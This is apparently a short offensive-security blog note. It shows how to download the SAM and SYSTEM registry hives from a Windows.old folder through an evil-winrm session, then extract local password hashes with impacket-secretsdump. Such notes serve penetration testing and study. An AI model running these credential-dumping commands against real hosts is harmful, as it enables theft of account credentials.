---
layout: post
title: secretsdump
titledate: 11/01/23
tags: ["infosec","offsec","impacket", "hive"]
---

#### windows.old

    $ evil-winrm: download C:\windows.old\Windows\System32\SYSTEM
    $ evil-winrm: download C:\windows.old\Windows\System32\SAM

download both then with impacket

    └─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL

